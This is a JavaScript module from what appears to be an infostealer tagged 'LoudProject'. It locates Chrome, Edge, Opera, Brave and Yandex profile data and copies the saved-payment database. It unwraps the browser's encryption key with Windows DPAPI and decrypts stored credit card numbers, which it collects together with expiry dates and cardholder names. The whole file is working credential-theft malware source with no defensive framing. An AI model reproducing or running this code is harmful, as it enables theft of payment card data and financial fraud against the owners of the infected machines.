const Dpapi = require("node-dpapi-prebuilt");
const fs = require("fs");
const crypto = require("crypto");
let { state } = require("../../data/data");
const appdata = process.env.LOCALAPPDATA || "";
const sqlite3 = require("sqlite3");

/**
 * Retrieves credit card information from a specific browser profile.
 * 
 * @param {string} path - The path to the browser profile folder (e.g., the Chrome or Firefox profile folder).
 * @returns {Promise<string>} A promise that resolves to a string containing the retrieved credit card information.
 * 
 * This function copies the necessary files, extracts the decryption key, decrypts sensitive information, 
 * and returns a summary of the credit cards found in the browser profile.
 */

async function getCreditcards(path) {
  const path_split = path.split("\\");
  const path_split_tail = path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2);
  let path_tail = path_split_tail.join("\\") + "\\";
  if (!path.startsWith(appdata)) path_tail = path;
  if (path.includes("cord")) return;
  if (!fs.existsSync(path_tail)) return;
  const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").subarray(5);

  const login_data = path + "Web Data";
  const creditcards_db = path + "creditcards.db";

  fs.copyFileSync(login_data, creditcards_db);

  if (creditcards_db.includes("Chrome") && !state.cardsBrowserUsed.has("Chrome")) {
    state.cardsBrowserUsed.add("Chrome");
  } else if (creditcards_db.includes("Firefox") && !state.cardsBrowserUsed.has("Firefox")) {
    state.cardsBrowserUsed.add("Firefox");
  } else if (creditcards_db.includes("Edge") && !state.cardsBrowserUsed.has("Edge")) {
    state.cardsBrowserUsed.add("Edge");
  } else if (creditcards_db.includes("Opera") && !state.cardsBrowserUsed.has("Opera")) {
    state.cardsBrowserUsed.add("Opera");
  } else if (creditcards_db.includes("Firefox") && !state.cardsBrowserUsed.has("Firefox")) {
    state.cardsBrowserUsed.add("Firefox");
  } else if (creditcards_db.includes("Yandex") && !state.cardsBrowserUsed.has("Yandex")) {
    state.cardsBrowserUsed.add("Yandex");
  } else if (creditcards_db.includes("Brave") && !state.cardsBrowserUsed.has("Brave")) {
    state.cardsBrowserUsed.add("Brave");
  }

  const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
  let result = `\n\nCREDIT CARDS FROM: ${path} #LoudProject`;

  const sql = new sqlite3.Database(creditcards_db, (err) => {
    if (err) {
    }
  });

  const cb = await new Promise((resolve) => {
    sql.each(
      "SELECT * FROM credit_cards",
      function (err, row) {
        if (err || !row["card_number_encrypted"]) return;

        const card_number = row["card_number_encrypted"];

        try {
          if (card_number[0] == 1 && card_number[1] == 0 && card_number[2] == 0 && card_number[3] == 0) {
            result +=
              "\nCREDIT CARD NUMBER: " +
              Dpapi.unprotectData(card_number, null, "CurrentUser").toString("utf-8") +
              " | EXPIRE: " +
              row["expiration_month"] +
              "/" +
              row["expiration_year"] +
              " | NAME: " +
              row["name_on_card"];
            state.ccCount.value++;
          } else {
            const start = card_number.slice(3, 15);
            const middle = card_number.slice(15, card_number.length - 16);
            const end = card_number.slice(card_number.length - 16, card_number.length);
            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

            decipher.setAuthTag(end);

            result +=
              "\nCREDIT CARD NUMBER: " +
              decipher.update(middle, "base64", "utf-8") +
              decipher.final("utf-8") +
              " | EXPIRE: " +
              row["expiration_month"] +
              "/" +
              row["expiration_year"] +
              " | NAME: " +
              row["name_on_card"];
            state.ccCount.value++;
          }
        } catch {}
      },
      function () {
        resolve(result);
      }
    );
  });

  return cb;
}

module.exports = getCreditcards;
